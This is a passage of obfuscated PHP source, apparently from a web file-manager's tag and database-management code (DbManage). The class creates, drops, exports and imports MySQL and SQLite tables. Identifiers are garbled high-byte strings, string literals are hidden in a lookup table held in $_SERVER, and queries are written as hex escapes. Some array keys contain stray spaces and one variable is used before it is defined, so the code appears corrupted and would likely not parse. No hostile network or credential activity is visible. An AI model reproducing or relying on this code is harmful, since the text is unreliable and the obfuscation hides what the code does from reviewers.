$ìÑ³µ[540] => $Ëë¿ğ–õ, $ìÑ³µ[180] => SourceModel::TYPE_GROUP); $¤®ì’Éø = Model($ìÑ³µ[1384])->listSource($ˆß«ÓÒ); if (!$¤®ì’Éø || count($ÜŠ¸õ×¨) == $¤®ì’Éø[$ìÑ³µ[412]][$ìÑ³µ[413]]) { return $¤®ì’Éø; } $ìÒü†Ÿİ = array(); $Ò·úÕË = array_to_keyvalue($¤®ì’Éø[$ìÑ³µ[84]], $ìÑ³µ[12], $ìÑ³µ[183]); $‹€ş¿‰ = array_to_keyvalue($¤®ì’Éø[$ìÑ³µ[85]], $ìÑ³µ[12], $ìÑ³µ[183]); $ ˆœÁÜÆ = array_merge($‹€ş¿‰, $Ò·úÕË); foreach ($ÜŠ¸õ×¨ as $¼©èØÌç) { if (!in_array($¼©èØÌç, $ ˆœÁÜÆ)) { $ìÒü†Ÿİ[] = $¼©èØÌç; } } if ($ìÒü†Ÿİ) { $this->removeBySource($Ëë¿ğ–õ, $ìÒü†Ÿİ); } return $¤®ì’Éø; } protected function listData($²ƒµ’÷¯) { $ùšé¿Æ =& $_SERVER[•Ùç É]; $¿Ìİì”İ = array($ùšé¿Æ[1696] => 0, $ùšé¿Æ[528] => array($ùšé¿Æ[2019], 0), $ùšé¿Æ[466] => $ùšé¿Æ[2020] . $²ƒµ’÷¯); $œÓÏ¾»‹ = $ùšé¿Æ[2021]; $ğüı‹µ = $this->field($œÓÏ¾»‹)->where($¿Ìİì”İ)->order($ùšé¿Æ[2022])->select(); return $ğüı‹µ ? $ğüı‹µ : array(); } protected function addToTag($ùÅó£“, $ŒæöÅ–, $äë‹ƒµ) { $¾Äµ¤¢Ê =& $_SERVER[•Ùç É]; if (!$this->getByTagID($ùÅó£“, $äë‹ƒµ) || !$ŒæöÅ–) { return !1; } if (!Model($¾Äµ¤¢Ê[870])->pathInfo($ŒæöÅ–)) { return !1; } $¯ıÔÇ¸û = array($¾Äµ¤¢Ê[1696] => 0, $¾Äµ¤¢Ê[528] => $äë‹ƒµ, $¾Äµ¤¢Ê[465] => $ŒæöÅ–, $¾Äµ¤¢Ê[466] => $¾Äµ¤¢Ê[2023] . $ùÅó£“, $¾Äµ¤¢Ê[464] => $¾Äµ¤¢Ê[12], $¾Äµ¤¢Ê[1908] => 0); if ($this->where($¯ıÔÇ¸û)->find()) { return !1; } return $this->add($¯ıÔÇ¸û); } protected function removeFromTag($‰•«Çò€, $Ï÷ÊÑšÆ, $¡š·ƒ§) { $ÕÕ¿öÖ =& $_SERVER[•Ùç É]; if (!$this->getByTagID($‰•«Çò€, $¡š·ƒ§) || !$Ï÷ÊÑšÆ) { return !1; } if (is_array($Ï÷ÊÑšÆ)) { $Ï÷ÊÑšÆ = array($ÕÕ¿öÖ[7], $Ï÷ÊÑšÆ); } $ŞÉÈªÍ— = array($ÕÕ¿öÖ[1696] => 0, $ÕÕ¿öÖ[528] => $¡š·ƒ§, $ÕÕ¿öÖ[466] => $ÕÕ¿öÖ[2023] . $‰•«Çò€, $ÕÕ¿öÖ[465] => $Ï÷ÊÑšÆ); return $this->where($ŞÉÈªÍ—)->delete(); } protected function removeByTag($Ú¾Ö ¸Å, $¼‚ößªï) { $¯“Š„ =& $_SERVER[•Ùç É]; if (!$this->getByTagID($Ú¾Ö ¸Å, $¼‚ößªï)) { return !1; } $È“Çƒš = array($¯“Š„[1696] => 0, $¯“Š„[528] => $¼‚ößªï, $¯“Š„[466] => $¯“Š„[2023] . $Ú¾Ö ¸Å); return $this->where($È“Çƒš)->delete(); } protected function removeBySource($’Ä¿›“ø, $…¥´®À‘) { $Š¢‘®Ô• =& $_SERVER[•Ùç É]; if (!$’Ä¿›“ø || !$…¥´®À‘) { return !1; } if (is_array($…¥´®À‘)) { $…¥´®À‘ = array($Š¢‘®Ô•[7], $…¥´®À‘); } $†›íØÒ› = array($Š¢‘®Ô•[1696] => 0, $Š¢‘®Ô•[465] => $…¥´®À‘, $Š¢‘®Ô•[528] => array($Š¢‘®Ô•[1065], 0), $Š¢‘®Ô•[466] => $Š¢‘®Ô•[2023] . $’Ä¿›“ø); return $this->where($†›íØÒ›)->delete(); } } goto C–óÄĞµ‘‡; E†çØ¶á‘±: define($_SERVER[•Ùç É][284], 1); define($_SERVER[•Ùç É][285], 2); define($_SERVER[•Ùç É][286], 3); goto CÀ„É§òÕ; DğåˆËæøÈ: class DbManage { function __construct($ƒ¢’²ıŸ = array()) { $ï‘å•—º =& $_SERVER[•Ùç É]; if (empty($ƒ¢’²ıŸ)) { $ƒ¢’²ıŸ = $GLOBALS[$ï‘å•—º[6]][$ï‘å•—º[21]]; } $this->database = $ƒ¢’²ıŸ; } public function model($§úİÑÔé = '') { return new ModelBase($§úİÑÔé, $_SERVER[•Ùç É][12], $this->database); } public function db($èÏ·Òç = false) { $‡À©ÅÁ– =& $_SERVER[•Ùç É]; $Øìù¤¯‚ = array_change_key_case($this->database); if ($this->dbType() == $‡À©ÅÁ–[13] || !$èÏ·Òç) { return $this->model()->db(); } $ß®¯¡İ = $Øìù¤¯‚[$‡À©ÅÁ–[1023]]; $Øìù¤¯‚[$‡À©ÅÁ–[1023]] = $‡À©ÅÁ–[12]; if ($Øìù¤¯‚[$‡À©ÅÁ–[1018]] == $‡À©ÅÁ–[1015]) { $š€³¿ÀŞ = $Øìù¤¯‚[$‡À©ÅÁ–[1024]]; $Øìù¤¯‚[$‡À©ÅÁ–[1024]] = substr($š€³¿ÀŞ, 0, strrpos($š€³¿ÀŞ, $‡À©ÅÁ–[1110])); } $this->database = $Øìù¤¯‚; $ş˜Ú¬¥œ = $this->model()->db(); try { $Ì»³Éı = $ş˜Ú¬¥œ->execute("\x73\x68\x6f\x77\40\144\141\164\x61\x62\x61\163\x65\x73\x20\x6c\x69\153\x65\x20\47{$ß®¯¡İ}\47"); } catch (Exception $µšÏÒ¿ü) { } if (!$Ì»³Éı) { $ş˜Ú¬¥œ->execute("\143\x72\145\141\x74\145\40\x64\x61\x74\141\x62\x61\163\x65\x20\140{$ß®¯¡İ}\x60"); } $Øìù¤¯‚[$‡À©ÅÁ–[1023]] = $ß®¯¡İ; if ($Øìù¤¯‚[$‡À©ÅÁ–[1018]] == $‡À©ÅÁ–[1015]) { $Øìù¤¯‚[$‡À©ÅÁ–[1024]] .= $‡À©ÅÁ–[1110] . $ß®¯¡İ; } $this->database = $Øìù¤¯‚; $ş˜Ú¬¥œ->execute("\x75\x73\x65\x20\x60{$ß®¯¡İ}\140"); return $ş˜Ú¬¥œ; } public function createTable($”éÒ“­ó, &$Èı…àÊ½) { $óÍÔ…Á• =& $_SERVER[•Ùç É]; if (!IO::exist($”éÒ“­ó)) { ActionCall($óÍÔ…Á•[1111], !0, 0); show_json(LNG($óÍÔ…Á•[1112]), !1); } $Ö±Ã­® = $this->model()->db(); $øÈÅõƒÓ = sqlSplit(IO::getContent($”éÒ“­ó)); foreach ($øÈÅõƒÓ as $ğÚÀå§·) { $ãÓ€±‹™ = stripos($ğÚÀå§·, $óÍÔ…Á•[1113]) === 0; if ($ãÓ€±‹™) { $Èı…àÊ½->task[$óÍÔ…Á•[831]] += 1; } $Ö±Ã­®->execute($ğÚÀå§·); if ($ãÓ€±‹™) { preg_match($óÍÔ…Á•[1114], $ğÚÀå§·, $øÏåîÜ); $Èı…àÊ½->task[$óÍÔ…Á•[1115]] = $øÏåîÜ[1]; $Èı…àÊ½->update(1); } } } public function insertTable($®°ÇĞ±Å, &$Óúß¶£µ) { $÷Ã²ü² =& $_SERVER[•Ùç É]; $îÜó¬ñÅ = $this->model()->db(); $”üøâÔ = $¢Ù³æ’­ ? array($¢Ù³æ’­) : $îÜó¬ñÅ->getTables(); foreach ($®°ÇĞ±Å as $ÄÑ´˜¬÷) { $¢Ù³æ’­ = basename($ÄÑ´˜¬÷, $÷Ã²ü²[833]); if (!in_array($¢Ù³æ’­, $”üøâÔ)) { continue; } $Óúß¶£µ->task[$÷Ã²ü²[1115]] = $¢Ù³æ’­; if (get_filesize($ÄÑ´˜¬÷) == 0) { continue; } $÷·¾ å = $this->sqlToDb($ÄÑ´˜¬÷, $Óúß¶£µ); if (!$÷·¾ å) { ActionCall($÷Ã²ü²[1111], !0, 0); show_json(LNG($÷Ã²ü²[1116]) . "\133{$¢Ù³æ’­}\135", !1); } } } public function sqlFromDb($‰–“ŸâÕ, $¢ó±Ñëä, &$í¾ğ§¡Ë, $Ë®ÉŠÁ = '') { if ($í¾ğ§¡Ë) { $í¾ğ§¡Ë->task[$_SERVER[•Ùç É][1115]] = $‰–“ŸâÕ; } $ÉÒÇ®‘’ = $this->model($‰–“ŸâÕ); $ô…³Èè = 0; $šÍŠÚõê = 0; $Û©Â¬—ô = 10000; $ÎÇÅø = fopen($¢ó±Ñëä, $_SERVER[•Ùç É][1117]); $Â­Á¬–Ö = $ÉÒÇ®‘’->getPk(); $’Ş˜ÖÍ = $ÉÒÇ®‘’->getDbFields(); $äÓñ‘¬ = $_SERVER[•Ùç É][12]; if ($GLOBALS[$_SERVER[•Ùç É][832]] && in_array($‰–“ŸâÕ, array($_SERVER[•Ùç É][1118], $_SERVER[•Ùç É][1119]))) { $äÓñ‘¬ = $‰–“ŸâÕ; } do { $¾³—Õ÷ó = array($Â­Á¬–Ö => array($_SERVER[•Ùç É][1065], $šÍŠÚõê)); $ìñ“ÎöÅ = $ÉÒÇ®‘’->where($¾³—Õ÷ó)->field($’Ş˜ÖÍ)->order($Â­Á¬–Ö . $_SERVER[•Ùç É][1120])->limit($Û©Â¬—ô)->select(); $ìñ“ÎöÅ = !empty($ìñ“ÎöÅ) ? $ìñ“ÎöÅ : array(); if (!($Ííß»»Ã = count($ìñ“ÎöÅ))) { break; } $Á¼÷Ñæ• = end($ìñ“ÎöÅ); $šÍŠÚõê = $Á¼÷Ñæ•[$Â­Á¬–Ö]; $ÈÃÑ»ÎĞ = array(); foreach ($ìñ“ÎöÅ as $§ğà–) { if ($äÓñ‘¬) { if ($‰–“ŸâÕ == $_SERVER[•Ùç É][1118]) { if ($§ğà–[$_SERVER[•Ùç É][33]] == $_SERVER[•Ùç É][1121]) { $ÈØ¶‹¨ = json_decode($§ğà–[$_SERVER[•Ùç É][420]], !0); if ($ÈØ¶‹¨[$_SERVER[•Ùç É][32]] == $GLOBALS[$_SERVER[•Ùç É][832]] && $ÈØ¶‹¨[$_SERVER[•Ùç É][795]] != 1) { continue; } } } else { if ($§ğà–[$_SERVER[•Ùç É][33]] == $_SERVER[•Ùç É][1122] && $§ğà–[$_SERVER[•Ùç É][96]] == $_SERVER[•Ùç É][824]) { continue; } } } if ($Ë®ÉŠÁ) { $§ğà–[$_SERVER[•Ùç É][86]] = "\x7b\x69\157\72{$Ë®ÉŠÁ}\175" . substr($§ğà–[$_SERVER[•Ùç É][86]], strlen("\173\151\157\x3a{$§ğà–[$_SERVER[•Ùç É][862]]}\x7d")); $§ğà–[$_SERVER[•Ùç É][862]] = $Ë®ÉŠÁ; } $ÈÃÑ»ÎĞ[] = $_SERVER[•Ùç É][1123] . $this->sqlEncode($§ğà–) . $_SERVER[•Ùç É][1124]; } $Ù•…—ÎÁ = "\111\116\123\x45\122\124\40\111\x4e\124\117\40\x60{$‰–“ŸâÕ}\x60\x20\50\140" . implode($_SERVER[•Ùç É][1125], $’Ş˜ÖÍ) . $_SERVER[•Ùç É][1126]; fwrite($ÎÇÅø, $Ù•…—ÎÁ . implode($_SERVER[•Ùç É][1127], $ÈÃÑ»ÎĞ) . $_SERVER[•Ùç É][73] . PHP_EOL); $ô…³Èè += $Ííß»»Ã; if ($í¾ğ§¡Ë) { $í¾ğ§¡Ë->update($Ííß»»Ã); } } while ($Û©Â¬—ô == $Ííß»»Ã); fclose($ÎÇÅø); return $ô…³Èè; } public function sqlToDb($áèÍ¨× , &$´å·ÁÍö) { $›ãÁ›‡– =& $_SERVER[•Ùç É]; $ë³İ³ªú = $this->model()->db(); $ñµèÛ¡İ = @fopen($áèÍ¨× , $›ãÁ›‡–[1128]); if (!$ñµèÛ¡İ) { return !1; } $îğµŞ×“ = 0; $¥äïóÁç = $›ãÁ›‡–[12]; $“ö‡Îûø = array(); $›ÊÚÄ¶° = $this->dbType(); $É££ãš¶ = $›ÊÚÄ¶° == $›ãÁ›‡–[13] ? 500 : 2000; $óÃÉÊ¢À = basename($áèÍ¨× , $›ãÁ›‡–[833]); $“¹¸¡º© = 0; $ªùÚÌÙ¾ = 4194304 - 104858; $ı¤äªİÁ = 1000000 - 104858; while (!feof($ñµèÛ¡İ)) { $˜‘Ïãú¦ = trim(fgets($ñµèÛ¡İ)); if (!$˜‘Ïãú¦) { continue; } $«ä©„Ø€ = $this->sqlDecode($˜‘Ïãú¦, $›ÊÚÄ¶°, $óÃÉÊ¢À); if (stripos($«ä©„Ø€, $›ãÁ›‡–[401]) === 0) { if (!$¥äïóÁç) { $¥äïóÁç = $«ä©„Ø€ . $›ãÁ›‡–[53]; } continue; } if ($´å·ÁÍö) { $´å·ÁÍö->task[$›ãÁ›‡–[831]] += 1; } $îğµŞ×“++; $“ö‡Îûø[] = rtrim(rtrim(trim($«ä©„Ø€), $›ãÁ›‡–[50]), $›ãÁ›‡–[73]); $½¢Ÿ¸Ê = null; $„ÎûòŒ¶ = strlen($«ä©„Ø€); $“¹¸¡º© += $„ÎûòŒ¶; if ($“¹¸¡º© >= ($É££ãš¶ == 500 ? $ı¤äªİÁ : $ªùÚÌÙ¾)) { $½¢Ÿ¸Ê = array_pop($“ö‡Îûø); if ($îğµŞ×“ > 1) { $îğµŞ×“--; } } if ($îğµŞ×“ >= $É££ãš¶ || $½¢Ÿ¸Ê) { $«ä©„Ø€ = $¥äïóÁç . implode($›ãÁ›‡–[50], $“ö‡Îûø); if (!$ë³İ³ªú->execute($«ä©„Ø€)) { return !1; } if ($´å·ÁÍö) { $´å·ÁÍö->update($îğµŞ×“); } $“ö‡Îûø = array(); $îğµŞ×“ = 0; $“¹¸¡º© = 0; if ($½¢Ÿ¸Ê) { $“ö‡Îûø = array($½¢Ÿ¸Ê); $îğµŞ×“ = 1; $“¹¸¡º© = $„ÎûòŒ¶; } } } fclose($ñµèÛ¡İ); if (!empty($“ö‡Îûø)) { $«ä©„Ø€ = $¥äïóÁç . implode($›ãÁ›‡–[50], $“ö‡Îûø); if (!$ë³İ³ªú->execute($«ä©„Ø€)) { return !1; } if ($´å·ÁÍö) { $´å·ÁÍö->update($îğµŞ×“); } } return !0; } public function dropTable($“Ô•ìï = null) { $­Â˜ÆÈ¿ = $this->model()->db(); $ÏúºÔí = $“Ô•ìï ? array($“Ô•ìï) : $­Â˜ÆÈ¿->getTables(); if (!$ÏúºÔí) { return; } foreach ($ÏúºÔí as $“Ô•ìï) { if ($“Ô•ìï) { $“Ô•ìï = strtolower($“Ô•ìï); } else { continue; } $­Â˜ÆÈ¿->execute("\144\162\x6f\x70\x20\164\141\142\154\145\40\x69\146\x20\x65\x78\x69\163\164\163\x20\x60{$“Ô•ìï}\140"); } } private function sqlEncode($º˜âöÇ×) { $”Šã–Œ­ =& $_SERVER[•Ùç É]; $âğØ¿õÏ = array(); foreach ($º˜âöÇ× as $¡şµ¾Õ) { if (is_array($¡şµ¾Õ)) { $¡şµ¾Õ = json_encode_force($¡şµ¾Õ); } $¡şµ¾Õ = addslashes($¡şµ¾Õ); $¡şµ¾Õ = str_replace(array($”Šã–Œ­[1129], $”Šã–Œ­[248]), array($”Šã–Œ­[1130], $”Šã–Œ­[1131]), $¡şµ¾Õ); $âğØ¿õÏ[] = str_replace($”Šã–Œ­[58], $”Šã–Œ­[1132], $¡şµ¾Õ); } return $”Šã–Œ­[58] . implode($”Šã–Œ­[1133], $âğØ¿õÏ) . $”Šã–Œ­[58]; } private function sqlDecode($ù‘ÂÚí†, $€¯¹ÍŠˆ, $›ÃøóÖİ = '') { $­¶·§ü =& $_SERVER[•Ùç É]; $ù‘ÂÚí† = str_replace(array($­¶·§ü[1130], $­¶·§ü[1131]), array($­¶·§ü[1129], $­¶·§ü[248]), $ù‘ÂÚí†); if ($€¯¹ÍŠˆ == $­¶·§ü[13]) { return $›ÃøóÖİ != $­¶·§ü[1134] ? stripslashes($ù‘ÂÚí†) : $ù‘ÂÚí†; } if ($›ÃøóÖİ == $­¶·§ü[1134]) { $ù‘ÂÚí† = str_replace($­¶·§ü[1135], $­¶·§ü[120], stripslashes($ù‘ÂÚí†)); } return $ù‘ÂÚí†; } public function getSqlFile($ûæù¡–ñ = '') { $£Õ²á»÷ =& $_SERVER[•Ùç É]; $š„™İÂü = $this->dbType(!0); $ÅŒ¾ê­œ = CONTROLLER_DIR . "\151\156\163\164\x61\x6c\154\57\x64\x61\164\141\57{$š„™İÂü}\x2e\x73\x71\x6c"; $Íë¨»—é = file_get_contents($ÅŒ¾ê­œ); $âÖª¹Ì¡ = $£Õ²á»÷[1136] . ($š„™İÂü == $£Õ²á»÷[849] ? $£Õ²á»÷[1137] : $£Õ²á»÷[1138]) . $£Õ²á»÷[1139]; preg_match_all($âÖª¹Ì¡, $Íë¨»—é, $Ù¿¿çˆ); $±ïµŠ˜ = $Ù¿¿çˆ[1]; $ïÅ¢ëÜ‚ = $this->model()->db(); $œ»›˜‚¡ = $ïÅ¢ëÜ‚->getTables(); $•£¡·¸ì = TEMP_FILES . $£Õ²á»÷[1140] . date($£Õ²á»÷[257]) . $£Õ²á»÷[8]; del_dir($•£¡·¸ì); mk_dir($•£¡·¸ì); $Ø¤½ÅêŞ = $•£¡·¸ì . $£Õ²á»÷[1141]; $´Æ…¨¬ = $•£¡·¸ì . $£Õ²á»÷[1142]; $Ş “ô— = $š„™İÂü == $£Õ²á»÷[13] ? $£Õ²á»÷[849] : $£Õ²á»÷[13]; IO::copy(CONTROLLER_DIR . "\x69\x6e\x73\164\x61\x6c\154\x2f\144\141\164\141\x2f{$Ş “ô—}\56\x73\161\x6c", $•£¡·¸ì); @touch($•£¡·¸ì . $š„™İÂü . $£Õ²á»÷[833]); $´Îã½×½ = fopen($Ø¤½ÅêŞ, $£Õ²á»÷[1117]); $ÁÏôûí = fopen($´Æ…¨¬, $£Õ²á»÷[1117]); if ($š„™İÂü == $£Õ²á»÷[13]) { $œ»›˜‚¡ = array_diff($œ»›˜‚¡, array($£Õ²á»÷[829], $£Õ²á»÷[830])); $Á¿ô­¦Ê = array($£Õ²á»÷[1143], $£Õ²á»÷[1144], $£Õ²á»÷[1145]); fwrite($ÁÏôûí, implode(PHP_EOL, $Á¿ô­¦Ê) . PHP_EOL . PHP_EOL); foreach ($œ»›˜‚¡ as $©Ù·ÏÊ) { $§óÏæ = $this->sqlFromSqlite($©Ù·ÏÊ); if (!$§óÏæ[$£Õ²á»÷[13]]) { continue; } fwrite($ÁÏôûí, $§óÏæ[$£Õ²á»÷[13]] . PHP_EOL . PHP_EOL); if (!in_array($©Ù·ÏÊ, $±ïµŠ˜)) { fwrite($´Îã½×½, $§óÏæ[$£Õ²á»÷[849]] . PHP_EOL . PHP_EOL); } } } else { foreach ($œ»›˜‚¡ as $©Ù·ÏÊ) { $§óÏæ = $this->sqlFromMysql($©Ù·ÏÊ); if (!$§óÏæ[$£Õ²á»÷[849]]) { continue; } fwrite($´Îã½×½, $§óÏæ[$£Õ²á»÷[849]] . PHP_EOL . PHP_EOL); if (!in_array($©Ù·ÏÊ, $±ïµŠ˜)) { fwrite($ÁÏôûí, $§óÏæ[$£Õ²á»÷[13]] . PHP_EOL . PHP_EOL); } } } fclose($´Îã½×½); fclose($ÁÏôûí); $Íë¨»—é = array($£Õ²á»÷[849] => $Ø¤½ÅêŞ, $£Õ²á»÷[13] => $´Æ…¨¬); return $ûæù¡–ñ ? $Íë¨»—é[$ûæù¡–ñ] : $Íë¨»—é; } public function dbType($œ¹§ıŒ = false) { $ö÷âº– =& $_SERVER[•Ùç É]; $İÀí€ôÉ = $œ¹§ıŒ ? $GLOBALS[$ö÷âº–[6]][$ö÷âº–[21]] : $this->database; $İÀí€ôÉ = array_change_key_case($İÀí€ôÉ); $˜ŞçÀ†Ñ = $İÀí€ôÉ[$ö÷âº–[1018]]; if ($˜ŞçÀ†Ñ == $ö÷âº–[1015]) { $¦¶½‡½é = explode($ö÷âº–[4], $İÀí€ôÉ[$ö÷âº–[1024]]); $˜ŞçÀ†Ñ = $¦¶½‡½é[0]; } $³æáÑÕ¯ = array($ö÷âº–[1146] => $ö÷âº–[13], $ö÷âº–[963] => $ö÷âº–[849]); if (isset($³æáÑÕ¯[$˜ŞçÀ†Ñ])) { $˜ŞçÀ†Ñ = $³æáÑÕ¯[$˜ŞçÀ†Ñ]; } return $˜ŞçÀ†Ñ; } public function sqlFromMysql($á‘­ÓéÚ, $×ğäõÇ• = '') { $ËÖÓ­é =& $_SERVER[•Ùç É]; $¸Âú‹È— = $this->model()->db(); $’¹ÎÔ = $¸Âú‹È—->query($ËÖÓ­é[1147] . $á‘­ÓéÚ . $ËÖÓ­é[431]); if (!$’¹ÎÔ || !$’¹ÎÔ[0]) { return !1; } $»â•­­‰ = _get($’¹ÎÔ[0], $ËÖÓ­é[1148], $ËÖÓ­é[12]); if (!$»â•­­‰) { return !1; } $‚Òõó» = "\x44\122\117\120\40\124\x41\x42\114\105\x20\111\x46\x20\x45\x58\x49\x53\x54\x53\x20\x60{$á‘­ÓéÚ}\x60\x3b" . PHP_EOL . $»â•­­‰ . $ËÖÓ­é[73]; if ($×ğäõÇ• && $×ğäõÇ• == $ËÖÓ­é[849]) { return $‚Òõó»; } $ŒªìÒõƒ = array_change_key_case($GLOBALS[$ËÖÓ­é[6]][$ËÖÓ­é[21]]); $ò¦ÅÒ† = $ŒªìÒõƒ[$ËÖÓ­é[1023]]; $şÔ÷óˆœ = $ËÖÓ­é[1149] . $ò¦ÅÒ† . $ËÖÓ­é[1150] . $á‘­ÓéÚ . $ËÖÓ­é[58]; $¥©êĞ·Æ = $ËÖÓ­é[1151] . $á‘­ÓéÚ . $ËÖÓ­é[951]; $Ñßğ¶î¨ = $¸Âú‹È—->query($şÔ÷óˆœ); if (empty($Ñßğ¶î¨)) { $Æğ§ÚğÅ = array($ËÖÓ­é[849] => $ËÖÓ­é[12], $ËÖÓ­é[13] => $ËÖÓ­é[12]); return $×ğäõÇ• ? $Æğ§ÚğÅ[$×ğäõÇ•] : $Æğ§ÚğÅ; } $ ß—£¬ = $¸Âú‹È—->query($¥©êĞ·Æ); $»â€ˆË = $ËÖÓ­é[12]; $ß¾Ü•õ¥ = array(); foreach ($ ß—£¬ as $Í½Åµ´ª) { if (!$»â€ˆË && $Í½Åµ´ª[$ËÖÓ­é[1152]] == $ËÖÓ­é[1153]) { $»â€ˆË = $Í½Åµ´ª[$ËÖÓ­é[1154]]; } if (isset($ß¾Ü•õ¥[$Í½Åµ´ª[$ËÖÓ­é[1152]]])) { $ß¾Ü•õ¥[$Í½Åµ´ª[$ËÖÓ­é[1152]]][$ËÖÓ­é[1155]][] = $Í½Åµ´ª[$ËÖÓ­é[1154]]; continue; } $ß¾Ü•õ¥[$Í½Åµ´ª[$ËÖÓ­é[1152]]] = array($ËÖÓ­é[1156] => $Í½Åµ´ª[$ËÖÓ­é[1152]], $ËÖÓ­é[1155] => array($Í½Åµ´ª[$ËÖÓ­é[1154]]), $ËÖÓ­é[1157] => $Í½Åµ´ª[$ËÖÓ­é[1158]] == $ËÖÓ­é[90] ? 0 : 1); } $Ô‡°•Ìë = array(); foreach ($ß¾Ü•õ¥ as $Í½Åµ´ª) { $óáƒ‡Å = $Í½Åµ´ª[$ËÖÓ­é[1156]] == $ËÖÓ­é[1153]; $õéäÕ = array($ËÖÓ­é[1159], $Í½Åµ´ª[$ËÖÓ­é[1157]] == $ËÖÓ­é[90] && !$óáƒ‡Å ? $ËÖÓ­é[1160] : $ËÖÓ­é[12], $ËÖÓ­é[1161], $ËÖÓ­é[1162] . $á‘­ÓéÚ . $ËÖÓ­é[11] . ($óáƒ‡Å ? $ËÖÓ­é[1163] : $Í½Åµ´ª[$ËÖÓ­é[1156]]) . $ËÖÓ­é[120], $ËÖÓ­é[1164], $ËÖÓ­é[120] . $á‘­ÓéÚ . $ËÖÓ­é[120], $ËÖÓ­é[1165] . implode($ËÖÓ­é[1166], $Í½Åµ´ª[$ËÖÓ­é[1155]]) . $ËÖÓ­é[1167]); $Ô‡°•Ìë[] = implode($ËÖÓ­é[53], $õéäÕ) . $ËÖÓ­é[73]; } $×šÂ§Ğö = array(); $¹¢¥Ÿ„ = array($ËÖÓ­é[1168] => $ËÖÓ­é[1169], $ËÖÓ­é[1169] => $ËÖÓ­é[1169], $ËÖÓ­é[334] => $ËÖÓ­é[361], $ËÖÓ­é[333] => $ËÖÓ­é[361]); foreach ($Ñßğ¶î¨ as $Í½Åµ´ª) { $õéäÕ = array($ËÖÓ­é[120] . $Í½Åµ´ª[$ËÖÓ­é[1170]] . $ËÖÓ­é[120], isset($¹¢¥Ÿ„[$Í½Åµ´ª[$ËÖÓ­é[1171]]]) ? $¹¢¥Ÿ„[$Í½Åµ´ª[$ËÖÓ­é[1171]]] : $Í½Åµ´ª[$ËÖÓ­é[1172]], $Í½Åµ´ª[$ËÖÓ­é[1173]] == $ËÖÓ­é[949] ? $ËÖÓ­é[1174] : $ËÖÓ­é[1175], $Í½Åµ´ª[$ËÖÓ­é[1170]] == $»â€ˆË ? $ËÖÓ­é[1176] : $ËÖÓ­é[12], $Í½Åµ´ª[$ËÖÓ­é[1000]] ? strtoupper(str_replace($ËÖÓ­é[11], $ËÖÓ­é[12], $Í½Åµ´ª[$ËÖÓ­é[1000]])) : $ËÖÓ­é[12]); $×šÂ§Ğö[] = trim(implode($ËÖÓ­é[53], $õéäÕ)); } $‡·êé¡ = array($ËÖÓ­é[1177] . $á‘­ÓéÚ . $ËÖÓ­é[1178], $ËÖÓ­é[1179] . $á‘­ÓéÚ . $ËÖÓ­é[1180], implode($ËÖÓ­é[50] . PHP_EOL, $×šÂ§Ğö), $ËÖÓ­é[997]); $´®ò§·õ = implode(PHP_EOL, array_merge($‡·êé¡, $Ô‡°•Ìë)); if ($×ğäõÇ• && $×ğäõÇ• == $ËÖÓ­é[13]) { return $´®ò§·õ; } $Æğ§ÚğÅ = array($ËÖÓ­é[849] => $‚Òõó», $ËÖÓ­é[13] => $´®ò§·õ); return $×ğäõÇ• ? $Æğ§ÚğÅ[$×ğäõÇ•] : $Æğ§ÚğÅ; } public function sqlFromSqlite($âŸï¥Ø¹, $î¬…·«ˆ = '') { $×Èê±«¥ =& $_SERVER[•Ùç É]; $ğôœ­˜£ = $this->model()->db(); $­šÑÒÈÍ = "\x50\x52\101\107\115\101\40\124\x41\x42\114\x45\137\x49\x4e\106\x4f\40\50\x27{$âŸï¥Ø¹}\x27\51"; $²¦ñş»û = "\x53\x45\114\x45\103\x54\x20\x2a\40\106\122\117\x4d\40\x73\x71\x6c\x69\164\145\x5f\155\x61\163\x74\x65\162\x20\x57\x48\105\x52\x45\x20\x74\142\154\137\x6e\141\155\x65\x20\75\40\47{$âŸï¥Ø¹}\47"; $Óæ¸ÂËÎ = $ğôœ­˜£->query($­šÑÒÈÍ); if (empty($Óæ¸ÂËÎ)) { $ÈÙ¸©¤Æ = array($×Èê±«¥[849] => $×Èê±«¥[12], $×Èê±«¥[13] => $×Èê±«¥[12]); return $î¬…·«ˆ ? $ÈÙ¸©¤Æ[$î¬…·«ˆ] : $ÈÙ¸©¤Æ; } $ä˜ÕŒ†Ì = $ğôœ­˜£->query($²¦ñş»û); $ç€¦Ê„œ = $îñË²§† = array(); foreach ($ä˜ÕŒ†Ì as $±½·Éú) { if ($±½·Éú[$×Èê±«¥[33]] == $×Èê±«¥[325]) { $ç€¦Ê„œ[] = $±½·Éú[$×Èê±«¥[1181]]; } else { $îñË²§†[$±½·Éú[$×Èê±«¥[32]]] = $±½·Éú[$×Èê±«¥[1181]]; } } $üáÍ° = array_merge(array($×Èê±«¥[1177] . $âŸï¥Ø¹ . $×Èê±«¥[120]), $ç€¦Ê„œ, array_values($îñË²§†)); $üáÍ° = implode($×Èê±«¥[73] . PHP_EOL, $üáÍ°) . $×Èê±«¥[73]; if ($î¬…·«ˆ && $î¬…·«ˆ == $×Èê±«¥[13]) { return $üáÍ°; } $æÕæœÄÜ = array(); $½·®°§í = array($×Èê±«¥[1169] => $×Èê±«¥[1182], $×Èê±«¥[361] => $×Èê±«¥[1183]); $§”ªôĞ = $×Èê±«¥[12]; foreach ($Óæ¸ÂËÎ as $±½·Éú) { if ($±½·Éú[$×Èê±«¥[57]] == $×Èê±«¥[90]) { $§”ªôĞ = $±½·Éú[$×Èê±«¥[32]]; } $‹À¥Ø = array($×Èê±«¥[431] . $±½·Éú[$×Èê±«¥[32]] . $×Èê±«¥[431], isset($½·®°§í[$±½·Éú[$×Èê±«¥[33]]]) ? $½·®°§í[$±½·Éú[$×Èê±«¥[33]]] : $±½·Éú[$×Èê±«¥[33]], $±½·Éú[$×Èê±«¥[35]] == $×Èê±«¥[90] ? $×Èê±«¥[1174] : $×Èê±«¥[1184] . $±½·Éú[$×Èê±«¥[56]], $±½·Éú[$×Èê±«¥[57]] == $×Èê±«¥[90] ? $×Èê±«¥[1185] : $×Èê±«¥[12]); $æÕæœÄÜ[] = trim(implode($×Èê±«¥[53], $‹À¥Ø)); } foreach ($îñË²§† as $Ø„£¢©± => $æ‡ĞèÚ‹) { $‡Àı§¸… = str_replace($×Èê±«¥[1186] . $âŸï¥Ø¹ . $×Èê±«¥[11], $×Èê±«¥[12], $Ø„£¢©±); $æ¤ëş¥á = str_replace(array($×Èê±«¥[120], $×Èê±«¥[1008]), $×Èê±«¥[431], substr($æ‡ĞèÚ‹, stripos($æ‡ĞèÚ‹, $×Èê±«¥[306]))); if ($‡Àı§¸… == 